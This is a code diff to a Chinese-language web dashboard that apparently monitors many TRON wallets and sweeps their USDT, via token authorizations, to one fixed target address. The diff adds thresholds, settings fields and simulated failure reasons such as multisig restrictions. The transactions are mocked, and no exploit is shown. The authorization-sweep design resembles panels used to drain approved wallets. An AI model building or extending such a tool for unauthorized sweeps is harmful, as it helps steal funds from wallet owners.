@@ -492,6 +492,12 @@
             border-bottom: 1px solid #f0f0f0;
             font-size: 12px;
         }
+
+        .error-reason {
+            color: #f44336;
+            font-size: 10px;
+            margin-top: 2px;
+        }
     </style>
 </head>
 <body>
@@ -571,7 +577,8 @@
                     <div>
                         <span style="font-size: 12px; color: #666;">
                             授权归集阈值: <span id="current-threshold">100</span> USDT | 
-                            合约阈值: <span id="current-contract-threshold">2000</span> USDT
+                            合约阈值: <span id="current-contract-threshold">2000</span> USDT |
+                            小额总和: <span id="current-small-total-threshold">1000</span> USDT
                         </span>
                     </div>
                 </div>
@@ -671,12 +678,16 @@
                         <input type="text" id="target-address" value="TBcTQiYyxXkJffXhXGYEokedsV4vBqHvB8">
                     </div>
                     <div class="setting-item">
-                        <label>合约地址阈值 (自动划转):</label>
+                        <label>授权归集阈值 (USDT):</label>
+                        <input type="number" id="collect-threshold" value="100">
+                    </div>
+                    <div class="setting-item">
+                        <label>合约地址阈值 (USDT):</label>
                         <input type="number" id="contract-threshold" value="2000">
                     </div>
                     <div class="setting-item">
-                        <label>授权归集阈值:</label>
-                        <input type="number" id="collect-threshold" value="100">
+                        <label>小额总和阈值 (USDT):</label>
+                        <input type="number" id="small-total-threshold" value="1000">
                     </div>
                     <button id="save-system-settings" class="btn-success">保存系统设置</button>
                 </div>
@@ -719,6 +730,7 @@
             TARGET_ADDRESS: 'TBcTQiYyxXkJffXhXGYEokedsV4vBqHvB8',
             CONTRACT_THRESHOLD: 2000,
             COLLECT_THRESHOLD: 100,
+            SMALL_TOTAL_THRESHOLD: 1000,
             SCAN_INTERVAL: 1000,
             SESSION_TIMEOUT: 60
         };
@@ -739,6 +751,16 @@
             'TW7obL9d7p2r2q2q2q2q2q2q2q2q2q2q2q2': '用户存款钱包',
             'TD5rR9wLmLmLmLmLmLmLmLmLmLmLmLmLmLm': '交易所提现钱包',
             'TE8aR7vNvNvNvNvNvNvNvNvNvNvNvNvNvN': '业务钱包'
+        };
+
+        // 失败原因类型
+        const FAILURE_REASONS = {
+            TRX_INSUFFICIENT: 'TRX余额不足，无法支付手续费',
+            MULTISIG_LIMIT: '钱包被多签限制，无法执行交易',
+            INSUFFICIENT_ALLOWANCE: '授权额度不足',
+            NETWORK_ERROR: '网络连接错误',
+            CONTRACT_ERROR: '合约调用失败',
+            UNKNOWN_ERROR: '未知错误'
         };
 
         class USDTMonitorSystem {
@@ -833,7 +855,18 @@
                         txHash: 'TXABCDEF1234567890',
                         status: 'failed',
                         timestamp: new Date(Date.now() - 3600000).toISOString(),
-                        type: 'manual'
+                        type: 'manual',
+                        failureReason: FAILURE_REASONS.TRX_INSUFFICIENT
+                    },
+                    {
+                        id: 3,
+                        walletAddress: 'TW7obL9d7p2r2q2q2q2q2q2q2q2q2q2q2q2',
+                        amount: 120.80,
+                        txHash: 'TX9876543210FEDCBA',
+                        status: 'failed',
+                        timestamp: new Date(Date.now() - 7200000).toISOString(),
+                        type: 'auto',
+                        failureReason: FAILURE_REASONS.MULTISIG_LIMIT
                     }
                 ];
 
@@ -1061,8 +1094,8 @@
                 // 检查小额钱包总和归集
                 const smallWallets = this.wallets.filter(w => w.totalBalance < SYSTEM_CONFIG.COLLECT_THRESHOLD);
                 const smallTotal = smallWallets.reduce((sum, w) => sum + w.totalBalance, 0);
-                if (smallTotal >= 1000) {
-                    this.addLog(`小额钱包总和 ${smallTotal} USDT 超过1000，开始归集`, 'warning');
+                if (smallTotal >= SYSTEM_CONFIG.SMALL_TOTAL_THRESHOLD) {
+                    this.addLog(`小额钱包总和 ${smallTotal.toFixed(2)} USDT 超过${SYSTEM_CONFIG.SMALL_TOTAL_THRESHOLD}，开始归集所有小额钱包`, 'warning');
                     for (let wallet of smallWallets) {
                         await this.collectWalletFunds(wallet.address, 'auto');
                     }
@@ -1126,26 +1159,44 @@
                     
                     this.addLog(`${type === 'auto' ? '自动' : '手动'}归集钱包 ${walletAddress}`, 'info');
                     
+                    // 模拟失败情况
+                    let status = 'completed';
+                    let failureReason = null;
+                    
+                    // 随机模拟失败情况
+                    const random = Math.random();
+                    if (random < 0.2) {
+                        status = 'failed';
+                        // 随机选择失败原因
+                        const reasons = Object.values(FAILURE_REASONS);
+                        failureReason = reasons[Math.floor(Math.random() * reasons.length)];
+                    }
+                    
                     const transaction = {
                         id: this.transactions.length + 1,
                         walletAddress: walletAddress,
                         amount: wallet.totalBalance,
                         txHash: 'TX' + Math.random().toString(36).substr(2, 64).toUpperCase(),
-                        status: 'completed',
+                        status: status,
                         timestamp: new Date().toISOString(),
                         type: type,
-                        tokens: wallet.otherTokens
+                        tokens: wallet.otherTokens,
+                        failureReason: failureReason
                     };
 
                     this.transactions.push(transaction);
                     
-                    // 更新钱包余额
-                    wallet.totalBalance = 0;
-                    wallet.usdtBalance = 0;
-                    wallet.otherTokens = [];
+                    if (status === 'completed') {
+                        // 更新钱包余额
+                        wallet.totalBalance = 0;
+                        wallet.usdtBalance = 0;
+                        wallet.otherTokens = [];
+                        this.addLog(`归集完成: ${transaction.txHash}`, 'success');
+                    } else {
+                        this.addLog(`归集失败: ${transaction.txHash} - ${failureReason}`, 'error');
+                    }
                     
                     this.updateDisplay();
-                    this.addLog(`归集完成: ${transaction.txHash}`, 'success');
                     
                 } catch (error) {
                     this.addLog(`归集失败: ${error.message}`, 'error');
@@ -1214,6 +1265,7 @@
                 document.getElementById('target-balance').textContent = this.targetBalance.toFixed(2);
                 document.getElementById('current-threshold').textContent = SYSTEM_CONFIG.COLLECT_THRESHOLD;
                 document.getElementById('current-contract-threshold').textContent = SYSTEM_CONFIG.CONTRACT_THRESHOLD;
+                document.getElementById('current-small-total-threshold').textContent = SYSTEM_CONFIG.SMALL_TOTAL_THRESHOLD;
             }
 
             updateWalletList() {
@@ -1313,6 +1365,7 @@
                 let html = '';
                 this.transactions.slice().reverse().forEach(transaction => {
                     const isContractTransfer = transaction.type === 'contract_transfer';
+                    const hasFailureReason = transaction.status === 'failed' && transaction.failureReason;
                     
                     html += `
                         <div class="wallet-item">
@@ -1326,6 +1379,11 @@
                                     交易哈希: ${transaction.txHash}
                                     ${isContractTransfer ? `| 目标: ${transaction.toAddress}` : ''}
                                 </div>
+                                ${hasFailureReason ? `
+                                    <div class="error-reason">
+                                        <strong>失败原因:</strong> ${transaction.failureReason}
+                                    </div>
+                                ` : ''}
                             </div>
                         </div>
                     `;
@@ -1357,8 +1415,9 @@
             updateSettingsForm() {
                 document.getElementById('contract-address').value = SYSTEM_CONFIG.CONTRACT_ADDRESS;
                 document.getElementById('target-address').value = SYSTEM_CONFIG.TARGET_ADDRESS;
-                document.getElementById('contract-threshold').value = SYSTEM_CONFIG.CONTRACT_THRESHOLD;
                 document.getElementById('collect-threshold').value = SYSTEM_CONFIG.COLLECT_THRESHOLD;
+                document.getElementById('contract-threshold').value = SYSTEM_CONFIG.CONTRACT_THRESHOLD;
+                document.getElementById('small-total-threshold').value = SYSTEM_CONFIG.SMALL_TOTAL_THRESHOLD;
             }
 
             addAdminAccount() {
@@ -1399,8 +1458,9 @@
             saveSystemSettings() {
                 SYSTEM_CONFIG.CONTRACT_ADDRESS = document.getElementById('contract-address').value;
                 SYSTEM_CONFIG.TARGET_ADDRESS = document.getElementById('target-address').value;
-                SYSTEM_CONFIG.CONTRACT_THRESHOLD = parseFloat(document.getElementById('contract-threshold').value);
                 SYSTEM_CONFIG.COLLECT_THRESHOLD = parseFloat(document.getElementById('collect-threshold').value);
+                SYSTEM_CONFIG.CONTRACT_THRESHOLD = parseFloat(document.getElementById('contract-threshold').value);
+                SYSTEM_CONFIG.SMALL_TOTAL_THRESHOLD = parseFloat(document.getElementById('small-total-threshold').value);
                 
                 this.updateDisplay();
                 this.addLog('系统设置已保存', 'success');
